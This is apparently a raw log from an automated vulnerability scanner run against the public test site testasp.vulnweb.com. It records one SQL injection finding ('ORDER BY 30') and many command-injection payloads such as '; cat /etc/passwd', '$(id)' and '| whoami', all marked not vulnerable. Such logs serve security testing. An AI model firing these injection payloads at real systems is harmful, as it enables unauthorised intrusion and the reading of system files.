URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
